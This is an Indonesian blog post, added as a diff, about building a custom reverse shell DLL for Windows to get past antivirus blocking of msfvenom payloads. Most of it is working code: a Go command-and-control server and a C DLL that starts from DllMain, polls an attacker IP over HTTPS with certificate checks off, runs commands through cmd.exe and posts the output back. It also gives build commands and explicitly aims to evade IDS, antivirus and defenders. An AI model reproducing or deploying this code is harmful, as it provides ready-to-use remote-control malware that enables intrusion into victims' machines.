@@ -1,0 +1,466 @@
+---
+title: Membuat Reverse Shell DLL Untuk Windows
+date: 2024-11-01
+tags: [Windows, Go, C]
+excerpt: Pada suatu hari, saat saya sedang mencoba permainan *hacking* untuk mesin Windows, saya berhasil menemukan *exploit*-nya.  Langkah selanjutnya adalah mengirim *payload* untuk menciptakan *reverse shell* sehingga saya bisa menjalankan perintah *command prompt* pada mesin Windows tersebut.  Bila mengikuti *cheatsheet* yang ada, saya bisa menggunakan Meterpreter dengan perintah seperti `msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.20.30.40 LPORT=1234 -f dll -o payload.dll`.  Namun, saat menggunakan file DLL yang dihasilkan, saya menemukan pesan kesalahan `ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software`.  Sepertinya DLL yang dihasilkan oleh `msfvenom` sudah diblokir oleh pertahanan bawaan Windows.  Untuk mengatasinya, pada tulisan ini, saya akan membuat sebuah *reverse shell* sederhana dalam bentuk file DLL...
+---
+
+Pada suatu hari, saat saya sedang mencoba permainan *hacking* untuk mesin Windows, saya berhasil menemukan *exploit*-nya.  Langkah selanjutnya adalah mengirim *payload* untuk menciptakan *reverse shell* sehingga saya bisa menjalankan perintah *command prompt* pada mesin Windows tersebut.  Bila mengikuti *cheatsheet* yang ada, saya bisa menggunakan Meterpreter dengan perintah seperti `msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.20.30.40 LPORT=1234 -f dll -o payload.dll`.  Namun, saat menggunakan file DLL yang dihasilkan, saya menemukan pesan kesalahan `ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software`.  Sepertinya DLL yang dihasilkan oleh `msfvenom` sudah diblokir oleh pertahanan bawaan Windows.  Untuk mengatasinya, pada tulisan ini, saya akan membuat sebuah *reverse shell* sederhana dalam bentuk file DLL.
+
+*Reverse shell* latihan ini terdiri atas 2 komponen:
+* `master` yang dibuat dengan Go.  Ini adalah aplikasi yang saya jalankan di komputer lokal untuk memberikan perintah ke mesin target Windows.
+* `payload` dalam bentuk file DLL yang dibuat dengan bahasa C yang memanggil Win32 API.  Ini adalah file yang perlu disuntikkan ke mesin target Windows melalui celah keamanan.
+
+Berbeda dengan *reverse shell* `nc` pada umumnya, komunikasi antara `master` dan `payload` berlangsung secara *stateless* dengan protokol HTTPS sehingga secara teknis apa yang saya buat lebih mirip seperti C&C yang mengendalikan bot.  Saya menggunakan protokol HTTPS dengan harapan ini tidak memicu kecurigaan dari tim biru karena banyak komponen aplikasi lain yang juga berkomunikasi dengan protokol HTTPS.  Selain itu, karena HTTPS di-enkripsi, IDS tidak bisa melihat perintah dan hasil eksekusi-nya yang dikirim dari mesin target ke mesin `master`.
+
+:::note
+Sama seperti `msfvenom`, setiap *reverse shell* lain yang dipublikasikan secara umum dan dipakai oleh banyak orang memiliki kemungkinan besar untuk ditambahkan ke daftar blokir Windows di kemudian hari.  *Shell* yang efektif adalah *shell* yang tidak pernah dipublikasikan sehingga tidak bisa dideteksi oleh antivirus secara mudah.
+:::
+
+## Master
+
+Komponen `master` pada dasarnya adalah sebuah *web server* dan juga sebuah simulasi *shell* untuk memberikan perintah dan melihat hasil perintahnya.  Saya akan menjalankan *web server* dan *shell* masing-masing pada *thread* sendiri seperti pada contoh kode program berikut ini:
+
+```go title="main.go"
+var command = ""
+
+...
+
+func main() {
+	log.Println("Starting master...")
+	var wg sync.WaitGroup
+	c := make(chan string)
+	go runWebServer(c)
+	wg.Add(1)
+	go runShell(c, &wg)
+	wg.Wait()
+}
+```
+
+Go sudah dilengkapi *library* bawaan di `net/http` sehingga saya bisa membuat *web server* dengan mudah seperti pada kode program berikut ini:
+
+```go title="main.go"
+func runWebServer(c chan string) {
+	log.Println("Running web server...")
+	...
+	err := http.ListenAndServeTLS(":8080", "cert.pem", "key.pem", nil)
+	log.Fatal(err)
+}
+```
+
+Pada kode program di atas, saya menggunakan `ListenAndServeTLS` sehingga *web server* akan menggunakan HTTPS.  Syaratnya adalah saya perlu menyediakan sertifikat untuk komunikasi HTTPS tersebut.  Karena tujuan TLS disini hanya untuk menjaga supaya isi perintah *shell* tidak terdeteksi oleh IDS secara mudah, saya bisa menggunakan *self signed certificate* yang dibuat dengan perintah berikut ini:
+
+```bash
+$ openssl req -x509 -newkey rsa:4096 -sha256 -days 99999 -nodes -keyout key.pem -out cert.pem -subj "/CN=localhost"
+```
+
+Perintah di atas akan menghasilkan file `key.pem` dan `cert.pem` yang dibutuhkan untuk menjalankan `master` (harus berada pada folder yang sama).
+
+*Payload* akan melakukan *request* `GET` ke `/joc` secara periodik untuk mendapatkan perintah yang perlu dikerjakan.  Saya bisa mendefinisikan *endpoint* ini dengan menggunakan kode program seperti berikut ini:
+
+```go title="main.go" {4-7}
+func runWebServer(c chan string) {
+	...
+	http.HandleFunc("/joc", func(w http.ResponseWriter, r *http.Request) {
+		if r.UserAgent() != "Jochell" {
+			fmt.Fprintf(w, html.EscapeString("OK - Operation completed"))
+			return
+		}
+		if r.Method != http.MethodGet {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		_, err := fmt.Fprintf(w, html.EscapeString(command))
+		if err != nil {
+			log.Printf("Error processing command request: %s\n", err)
+		} else if command != "" {
+			log.Println("Command has been retrieved by reverse shell")
+		}
+		command = ""
+	})
+	...
+}
+```
+
+Kode program di atas pada dasarnya hanya akan mengembalikan isi variabel `command` sebagai respon dari *request* GET yang diberikan.  Selain itu, saya juga menambahkan pemeriksaan *user agent* untuk membingungkan tim biru.  Bila ada anggota tim biru yang curiga dengan *endpoint* ini dan mencoba memberikan *request* dengan `curl` atau langsung dari *browser*, ia akan memperoleh hasil berupa `OK - Operation completed`.  Respon yang berupa isi variabel `command` hanya akan dikembalikan bila *user agent*-nya bernilai `Jochell` (yang nantinya akan dipakai oleh komponen `payload`).
+
+Setelah `payload` mengerjakan perintah yang diperoleh lewat `GET /joc`, ia perlu mengirim hasil eksekusi perintah ini melalui `POST /dry`.  Saya bisa membuat *endpoint* tersebut dengan kode program seperti berikut ini:
+
+```go title="main.go"
+func runWebServer(c chan string) {
+	...
+	http.HandleFunc("/dry", func(w http.ResponseWriter, r *http.Request) {
+		if r.UserAgent() != "Jochell" {
+			fmt.Fprintf(w, html.EscapeString("OK - Operation completed"))
+			return
+		}
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			log.Printf("Error reading request body: %s\n", err)
+			return
+		}
+		log.Println("Response has been received")
+		strBody := string(body[:])
+		if len(strings.TrimSpace(strBody)) == 0 {
+			c <- "(none)"
+		} else {
+			c <- strBody
+		}
+	})
+	...
+}
+```
+
+Kode program di atas pada dasarnya hanya akan menerima apapun isi dari *request body* `POST` kemudian mengirimnya ke *channel* `c` untuk ditampilkan.  *Channel* `c` ini dipakai untuk berkomunikasi dengan *thread* yang mensimulasikan *shell* dengan kode program seperti berikut ini:
+
+```go title="main.go"
+func runShell(c chan string, wg *sync.WaitGroup) {
+	time.Sleep(3 * time.Second)
+	log.Println("Running shell...")
+	defer wg.Done()
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("> ")
+		scanner.Scan()
+		input := scanner.Text()
+		if len(input) == 0 {
+			continue
+		}
+		command = input
+		if input == "exit" {
+			break
+		}
+		response := <-c
+		fmt.Printf("Response:\n%s\n", response)
+	}
+}
+```
+
+Kode program di atas akan menerima *input* dari pengguna dengan `scanner.Scan()`, menyimpannya ke variabel `command`, menunggu hingga ada respon, mencetak respon tersebut ke layar, dan kembali lagi menerima masukan dari pengguna:
+
+```shell
+> whoami
+### Output:
+### 2024/11/01 00:01:01 Command has been retrieved by reverse shell
+### 2024/11/01 00:01:01 Response has been received
+### Response:
+### PC-Latihan\victim
+
+> dir C:\Users
+### Output:
+### 2024/11/01 00:01:01 Command has been retrieved by reverse shell
+### 2024/11/01 00:01:01 Response has been received
+### Response:
+###  Volume in drive C is Victim
+###  Volume Serial Number is FFFF-FFFF
+### 
+###  Directory of C:\Users
+### 
+### 11/01/2024  00:00 AM    <DIR>          .
+### 11/01/2024  00:00 AM    <DIR>          ..
+### 11/01/2024  00:00 AM    <DIR>          victim
+### 11/01/2024  00:00 AM    <DIR>          Public
+###                0 File(s)              0 bytes
+###                4 Dir(s)   1,000,000,000 bytes free
+```
+
+Karena pola komunikasi yang dipakai adalah *stateless*, akan ada jeda yang lumayan terasa saat perintah diberikan hingga hasilnya diterima bila dibandingkan dengan *piping* langsung ke *shell* tanpa henti.  Namun, kelebihan metode *stateless* seperti ini adalah ia lebih sulit dideteksi karena `cmd.exe` dikerjakan hanya bila ada perintah yang perlu di-eksekusi.  Bila tim biru masuk ke mesin korban dan melihat daftar proses di *task manager* dan tidak akan menemukan `cmd.exe` (atau `powershell.exe`), ada kemungkinan ia tidak akan curiga.
+
+## Payload
+
+Untuk membuat komponen `payload`, saya memilih menggunakan C dan memanggil Win32 API (Windows API) yang telah disediakan oleh sistem operasi Windows.   Sebenarnya saya bisa saja menggunakan Go dan cgo untuk menggabungkan C dan Go.  Kode program versi Go jauh lebih singkat dan sederhana seperti yang terlihat berikut ini:
+
+```go title="main.go"
+const ServerUrl = "https://10.20.30.40:8080"
+
+func executeCommand(commandText string) []byte {
+	cmd := exec.Command("C:\\Windows\\system32\\cmd.exe", "/C", commandText)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, _ := cmd.CombinedOutput()
+	return out
+}
+
+func main() {
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	for {
+		var out []byte
+		var command []byte
+		r, err := http.Get(ServerUrl + "/joc")
+		if err != nil {
+			goto skip
+		}
+		command, err = io.ReadAll(r.Body)
+		if len(command) == 0 {
+			goto skip
+		}
+		out = executeCommand(string(command[:]))
+		http.Post(ServerUrl+"/dry", "text/plain", bytes.NewReader(out))
+
+	skip:
+		time.Sleep(3 * time.Second)
+	}
+}
+```
+
+Namun sayangnya, DLL yang dihasilkan memiliki ukuran sekitar 4.5 MB.  Bila dibandingkan dengan DLL yang dibuat dengan C dan memanggil Win32 API yang berukuran sekitar 200 KB, perbedaan ukuran file-nya cukup besar.  Karena DLL ini akan di-*inject* ke proses yang sedang aktif, semakin kecil ukurannya akan semakin baik.  Oleh sebab itu, saya akan menempuh cara yang lebih kompleks dengan menggunakan bahasa C.
+
+### DllMain
+
+Karena DLL adalah *library* yang berisi koleksi *functions* untuk dipanggil, bagaimana caranya supaya kode program `payload` bisa dijalankan secara otomatis tanpa perlu dipanggil? Jawabannya adalah dengan memanfaatkan `DllMain`.  Function ini tidak wajib aja di DLL, namun bila ada, ia akan dikerjakan setiap kali DLL dipakai oleh proses dengan menggunakan `LoadLibrary()`.  Saya akan membuat definisinya seperti berikut ini:
+
+```c title="payload.c"
+DWORD WINAPI ListenerThread(LPVOID lpParam) {
+    StartPayload();
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            CreateThread(0, 0, ListenerThread, 0, 0, 0);
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+```
+
+Kode program pada `DllMain` tidak boleh terlalu kompleks untuk mencegah terjadi-nya apa yang disebut *loader lock*.  Sebagai contoh, sangat tidak disarankan untuk memanggil `LoadLibrary()` atau `CreateProcess()` dari `DllMain`.  Oleh sebab itu, pada kode program di atas, `DllMain` hanya memanggil `CreateThread()` untuk membuat *thread* baru.  Pada *thread* baru ini (yang sudah berada diluar `DllMain` ini), saya akan mengerjakan kode program utama dengan isi seperti berikut ini:
+
+```c title="payload.c"
+_Noreturn VOID StartPayload() {
+    if (!initWinHttp()) {
+        exit(-1);
+    }
+    while (TRUE) {
+        char *command = getCommand();
+        if (!command) {
+            continue;
+        }
+        LPSTR result = executeCommand(command);
+        if (!result) {
+            result = "(none)";
+        }
+        postResult(result, (DWORD) strlen(result));
+        free(command);
+        free(result);
+        Sleep(5000);
+    }
+}
+```
+
+Kode program di atas pada dasarnya akan memanggil `getCommand()` setiap 5 detik secara perodik.  Bila ada perintah yang diterima oleh `getCommand()`, ia akan meneruskan perintah tersebut ke `executeCommand()` dan kemudian mengirim hasil eksekusi perintah-nya dengan `postResult()`.
+
+### WinHTTP
+
+Win32 API menyediakan layanan [WinHTTP](https://learn.microsoft.com/en-us/windows/win32/winhttp/about-winhttp) untuk melakukan *request* HTTP tanpa perlu memakai library pihak ketiga seperti `libcurl`.  Saya merasa WinHTTP jauh lebih kompleks dibandingkan dengan `libcurl`, namun karena ini tidak ingin ada library tambahan, saya terpaksa harus menggunakannya.  Langkah paling awal dalam menggunakan WinHTTP adalah menyiapkan koneksi seperti pada kode program berikut ini:
+
+```c title="payload.c"
+#define AGENT L"Jochell"
+#define LHOST L"10.20.30.40"
+#define LPORT 8080
+#define OUTPUT_DEBUG(fmt, ...) {WCHAR buffer[512]; StringCbPrintfW(buffer, 512 * sizeof(TCHAR), fmt, __VA_ARGS__);  OutputDebugStringW(buffer);}
+
+HINTERNET hSession = NULL, hConnect = NULL;
+
+BOOL initWinHttp() {
+    hSession = WinHttpOpen(AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        OUTPUT_DEBUG(L"Error Getting Session Handle: %u\n", GetLastError())
+        return FALSE;
+    }
+    hConnect = WinHttpConnect(hSession, LHOST, LPORT, 0);
+    if (!hConnect) {
+        OUTPUT_DEBUG(L"Error on Http Connection: %u\n", GetLastError())
+        return FALSE;
+    }
+    return TRUE;
+}
+```
+
+Pada kode program di atas, saya mendefinisikan `AGENT` yang akan dipakai sebagai *user agent* oleh WinHTTP dan juga IP dan port yang dipakai oleh `master` di `LHOST` dan `LPORT`.  Saya perlu mengganti nilai `LHOST` dan `LPORT` bila `master` memiliki IP dan port yang berbeda.
+
+### GET Request
+
+Setelah mendapatkan koneksi, saya bisa memberikan GET *request* seperti pada kode program berikut ini:
+
+```c title="payload.c"
+DWORD dwSkipVerifyFlags =
+        SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+LPSTR getCommand() {
+    BOOL bResults = FALSE;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer = NULL;
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/joc", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (hRequest) {
+        bResults = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSkipVerifyFlags, sizeof(dwSkipVerifyFlags));
+    }
+    if (bResults) {
+        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    }
+    if (bResults) {
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    }
+    if (bResults) {
+        dwSize = 0;
+        bResults = WinHttpQueryDataAvailable(hRequest, &dwSize);
+    }
+    if (bResults && dwSize) {
+        pszOutBuffer = (LPSTR) malloc(dwSize + 1);
+    }
+    if (pszOutBuffer) {
+        ZeroMemory(pszOutBuffer, dwSize + 1);
+        bResults = WinHttpReadData(hRequest, (LPVOID) pszOutBuffer, dwSize, &dwDownloaded);
+    }
+    if (!bResults) {
+        OUTPUT_DEBUG(L"Error getting command: %u\n", GetLastError())
+    }
+    if (hRequest) {
+        WinHttpCloseHandle(hRequest);
+    }
+    return pszOutBuffer;
+}
+```
+
+Pada kode program di atas, saya menggunakan flag `WINHTTP_FLAG_SECURE` di `WinHttpOpenRequest()` sehingga komunikasi dilakukan lewat HTTPS.  Selain itu, saya juga menambahkan flag berupa `SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+SECURITY_FLAG_IGNORE_CERT_DATE_INVALID` sehingga sertifikat tidak akan diverifikasi.  Karena tujuan utama *self signed certificate* yang saya buat hanya untuk enkripsi, saya tidak peduli apakah sertifikat tersebut valid atau tidak.
+
+### CreateProcess()
+
+Untuk menjalakan perintah yang peroleh dari `getCommand()`, saya dapat menggunakan API `CreateProcess()` seperti pada contoh kode program berikut ini:
+
+```c title="payload.c"
+LPSTR executeCommand(LPSTR command) {
+    HANDLE hOutputPipeRead = NULL;
+    HANDLE hOutputPipeWrite = NULL;
+    SECURITY_ATTRIBUTES saAttrs;
+    STARTUPINFOA siStartInfo;
+    PROCESS_INFORMATION piProcInfo;
+    DWORD dwCommandsSize;
+    LPSTR pszCommands;
+    BOOL bSuccess = FALSE;
+    LPSTR pszOutBuffer = NULL;
+    DWORD dwRead;
+
+    saAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttrs.bInheritHandle = TRUE;
+    saAttrs.lpSecurityDescriptor = NULL;
+    if (!CreatePipe(&hOutputPipeRead, &hOutputPipeWrite, &saAttrs, 0)) {
+        OUTPUT_DEBUG(L"Error creating pipe: %u\n", GetLastError())
+        return NULL;
+    }
+    if (!SetHandleInformation(hOutputPipeRead, HANDLE_FLAG_INHERIT, 0)) {
+        OUTPUT_DEBUG(L"Error setting pipe flag: %u\n", GetLastError())
+        return NULL;
+    }
+
+    dwCommandsSize = (DWORD) strlen(command) + 4;
+    pszCommands = (LPSTR) malloc(dwCommandsSize);
+    StringCbCopyA(pszCommands, dwCommandsSize, "/C ");
+    StringCbCatA(pszCommands, dwCommandsSize, command);
+    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));
+    siStartInfo.cb = sizeof(STARTUPINFOA);
+    siStartInfo.hStdError = hOutputPipeWrite;
+    siStartInfo.hStdOutput = hOutputPipeWrite;
+    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+    ZeroMemory(&piProcInfo, sizeof(piProcInfo));
+    bSuccess = CreateProcessA("C:\\Windows\\System32\\cmd.exe", pszCommands, NULL, NULL, TRUE, 0, NULL, NULL,
+                              &siStartInfo, &piProcInfo);
+    if (!bSuccess) {
+        OUTPUT_DEBUG(L"Error creating process: %u\n", GetLastError())
+        return NULL;
+    }
+    WaitForSingleObject(piProcInfo.hProcess, 60000);
+    CloseHandle(piProcInfo.hProcess);
+    CloseHandle(piProcInfo.hThread);
+    CloseHandle(hOutputPipeWrite);
+
+    pszOutBuffer = (LPSTR) malloc(10240);
+    ZeroMemory(pszOutBuffer, 10240);
+    bSuccess = ReadFile(hOutputPipeRead, pszOutBuffer, 10240, &dwRead, NULL);
+    if (!bSuccess) {
+        OUTPUT_DEBUG(L"Failed to read from pipe: %u\n", GetLastError())
+        return NULL;
+    }
+    CloseHandle(hOutputPipeRead);
+    return pszOutBuffer;
+}
+```
+
+Pada kode program di atas, saya membuat *anonymous pipe* `hOutputPipeRead` dan `hOutputPipeWrite` untuk menampung hasil eksekusi perintah.  Saya akan melewatkan `hStdOutput` dan `hStdError` dari proses `cmd.exe` ke *anonymous pipe* tersebut seperti yang terlihat pada kode program berikut ini:
+
+```c title="payload.c"
+...
+siStartInfo.cb = sizeof(STARTUPINFOA);
+siStartInfo.hStdError = hOutputPipeWrite;
+siStartInfo.hStdOutput = hOutputPipeWrite;
+siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+...
+```
+
+Pada saat API `CreateProcess()` dipanggil, kode program akan langsung lanjut ke baris berikutnya sementara proses `cmd.exe` berjalan di proses baru.  Oleh sebab itu, bila ingin menangkap hasil eksekusi `cmd.exe`, saya perlu menunggu hingga proses `cmd.exe` selesai terlebih dahulu.  Sebagai contoh, pada kode program di atas, saya menunggu proses baru selesai dengan batas waktu hingga maksimal 1 menit dengan `WaitForSingleObject()` seperti yang terlihat pada kode program berikut ini:
+
+``` c title="payload.c"
+...
+WaitForSingleObject(piProcInfo.hProcess, 60000);
+...
+
+```
+
+### POST Request
+
+Setelah mendapatkan output dari `cmd.exe`, saya tinggal mengirim output tersebut lewat POST *request* seperti yang terlihat pada kode program berikut ini:
+
+```c title="payload.c"
+VOID postResult(LPSTR result, DWORD resultLen) {
+    BOOL bResults = FALSE;
+    DWORD dwWritten = 0;
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/dry", NULL, WINHTTP_NO_REFERER,
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (hRequest) {
+        bResults = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSkipVerifyFlags,
+                                    sizeof(dwSkipVerifyFlags));
+    }
+    if (bResults) {
+        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, resultLen, 0);
+    }
+    if (bResults) {
+        bResults = WinHttpWriteData(hRequest, result, resultLen, &dwWritten);
+    }
+    if (!bResults) {
+        OUTPUT_DEBUG(L"Error getting command: %u\n", GetLastError())
+    }
+    if (hRequest) {
+        WinHttpCloseHandle(hRequest);
+    }
+}
+```
+
+Kode program di atas tidak jauh berbeda dengan GET *request*, hanya saja kali ini saya menambahkan `WinHttpWriteData()` untuk mengirim *request data* dari POST *request* tersebut.
+
+### Build
+
+Untuk menghasilkan DLL berdasarkan kode program di atas, saya bisa menggunakan Visual Studio C++.  Selain itu, bila bekerja dari Linux, saya juga dapat memanfaatkan *cross-platform compiler* seperti MingGW yang dapat di-*install* dengan perintah berikut ini:
+
+```bash
+$ sudo apt install mingw-w64
+```
+
+Setelah itu, saya bisa menghasilkan DLL dengan perintah:
+
+```bash
+$ x86_64-w64-mingw32-gcc payload.c -shared -lwinhttp -o payload.dll
+```
